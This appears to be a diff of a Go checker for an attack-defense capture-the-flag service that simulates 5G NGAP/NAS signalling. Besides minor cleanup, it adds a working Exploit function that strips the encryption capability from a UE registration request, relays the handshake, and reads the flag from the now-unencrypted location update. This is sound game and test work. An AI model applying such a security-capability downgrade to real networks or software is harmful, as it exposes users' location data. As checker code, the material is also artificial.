@@ -5,7 +5,6 @@ import (
 	"errors"
 	"log"
 	"net"
-	"time"
 
 	"checker/pkg/crypto"
 	"checker/pkg/ngap"
@@ -40,7 +39,7 @@ func New(log *logrus.Logger) *Handler {
 
 func (h *Handler) PutFlag(ctx context.Context, message *enochecker.TaskMessage) (*enochecker.HandlerInfo, error) {
 	var conn *grpc.ClientConn
-	conn, err := grpc.Dial(":9000", grpc.WithTransportCredentials(insecure.NewCredentials()))
+	conn, err := grpc.Dial(":9933", grpc.WithTransportCredentials(insecure.NewCredentials()))
 	if err != nil {
 		log.Fatalf("did not connect: %s", err)
 	}
@@ -50,11 +49,10 @@ func (h *Handler) PutFlag(ctx context.Context, message *enochecker.TaskMessage) 
 
 	md := metadata.Pairs("auth", "password")
 	ctx_grpc := metadata.NewOutgoingContext(context.Background(), md)
-	response, err := c.UpdateLocation(ctx_grpc, &pb.Loc{Position: message.Flag})
+	_, err = c.UpdateLocation(ctx_grpc, &pb.Loc{Position: message.Flag})
 	if err != nil {
 		return nil, err
 	}
-	log.Printf("Response from server: %s", response)
 	return nil, nil
 }
 
@@ -93,7 +91,6 @@ func (h *Handler) getFlagLocation(ctx context.Context, message *enochecker.TaskM
 		return err
 	}
 
-	time.Sleep(500 * time.Millisecond)
 	reply = make([]byte, 512)
 
 	// AuthReq
@@ -113,7 +110,6 @@ func (h *Handler) getFlagLocation(ctx context.Context, message *enochecker.TaskM
 		return err
 	}
 
-	time.Sleep(500 * time.Millisecond)
 	reply = make([]byte, 512)
 
 	_, err = ueConn.Read(reply)
@@ -137,7 +133,6 @@ func (h *Handler) getFlagLocation(ctx context.Context, message *enochecker.TaskM
 		return err
 	}
 
-	logrus.Println(reply)
 	down = ngap.DownNASTransMsg{}
 
 	err = ngap.DecodeMsg(reply[1:], &down)
@@ -150,7 +145,6 @@ func (h *Handler) getFlagLocation(ctx context.Context, message *enochecker.TaskM
 		return err
 	}
 
-	time.Sleep(500 * time.Millisecond)
 	reply = make([]byte, 512)
 
 	// LocationUpdate
@@ -159,8 +153,7 @@ func (h *Handler) getFlagLocation(ctx context.Context, message *enochecker.TaskM
 		return err
 	}
 
-	logrus.Println(reply)
-
+	// Remove trailing zeros for decryption
 	for i, b := range reply {
 		if (b == 0x00) && (reply[i+1] == 0x00) && (reply[i+2] == 0x00) {
 			reply = reply[:i]
@@ -257,7 +250,120 @@ func (h *Handler) GetServiceInfo() *enochecker.InfoMessage {
 }
 
 func (h *Handler) Exploit(ctx context.Context, message *enochecker.TaskMessage) (*enochecker.HandlerInfo, error) {
-	return nil, nil
+	coretcpAddr, err := net.ResolveTCPAddr("tcp", "localhost:3399")
+	if err != nil {
+		return nil, err
+	}
+
+	coreConn, err := net.DialTCP("tcp", nil, coretcpAddr)
+	if err != nil {
+		return nil, err
+	}
+
+	uetcpAddr, err := net.ResolveTCPAddr("tcp", "localhost:3000")
+	if err != nil {
+		return nil, err
+	}
+
+	ueConn, err := net.DialTCP("tcp", nil, uetcpAddr)
+	if err != nil {
+		return nil, err
+	}
+
+	reply := make([]byte, 512)
+	_, err = ueConn.Read(reply)
+	if err != nil {
+		return nil, err
+	}
+
+	var reg ngap.NASRegRequestMsg
+	err = ngap.DecodeMsg(reply[1:], &reg)
+	if err != nil {
+		return nil, errors.New("cannot decode")
+	}
+
+	// DISABLE EA
+	reg.SecCap.EA = 0
+
+	pdu, _ := ngap.EncodeMsg(ngap.NASRegRequest, &reg)
+
+	initUeMsg := ngap.InitUEMessageMsg{NasPdu: pdu, RanUeNgapId: 1}
+	buf, _ := ngap.EncodeMsg(ngap.InitUEMessage, &initUeMsg)
+
+	_, err = coreConn.Write(buf)
+	if err != nil {
+		return nil, err
+	}
+
+	reply = make([]byte, 512)
+
+	// AuthReq
+	_, err = coreConn.Read(reply)
+	if err != nil {
+		return nil, err
+	}
+
+	var down ngap.DownNASTransMsg
+	err = ngap.DecodeMsg(reply[1:], &down)
+	if err != nil {
+		return nil, errors.New("cannot decode")
+	}
+
+	_, err = ueConn.Write(down.NasPdu)
+	if err != nil {
+		return nil, err
+	}
+
+	reply = make([]byte, 512)
+
+	_, err = ueConn.Read(reply)
+	if err != nil {
+		return nil, err
+	}
+
+	// AuthRes
+	up := ngap.UpNASTransMsg{NasPdu: reply, RanUeNgapId: 1, AmfUeNgapId: 1}
+	buf, _ = ngap.EncodeMsg(ngap.UpNASTrans, &up)
+
+	_, err = coreConn.Write(buf)
+	if err != nil {
+		return nil, err
+	}
+
+	reply = make([]byte, 512)
+	// SecModeCmd
+	_, err = coreConn.Read(reply)
+	if err != nil {
+		return nil, err
+	}
+
+	down = ngap.DownNASTransMsg{}
+
+	err = ngap.DecodeMsg(reply[1:], &down)
+	if err != nil {
+		return nil, errors.New("cannot decode")
+	}
+
+	_, err = ueConn.Write(down.NasPdu)
+	if err != nil {
+		return nil, err
+	}
+
+	reply = make([]byte, 512)
+
+	// LocationUpdate
+	_, err = ueConn.Read(reply)
+	if err != nil {
+		return nil, err
+	}
+
+	var loc ngap.LocationUpdateMsg
+	err = ngap.DecodeMsg(reply[9:], &loc)
+	if err != nil {
+		return nil, errors.New("cannot decode")
+	}
+	return enochecker.NewExploitInfo(loc.Location), nil
+
 }
 
 func (h *Handler) PutNoise(ctx context.Context, message *enochecker.TaskMessage) error {
